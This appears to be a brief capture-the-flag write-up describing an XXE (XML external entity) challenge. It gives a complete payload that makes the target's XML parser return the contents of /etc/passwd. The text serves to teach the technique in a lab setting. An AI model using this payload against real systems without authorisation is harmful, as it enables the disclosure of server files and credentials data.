This challenge is based on XXE (XML injection).

Everytime we click on Details button, a post request with XML code is sent to the server.

All we have to do is write a XXE payload to print the /etc/passwd file.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
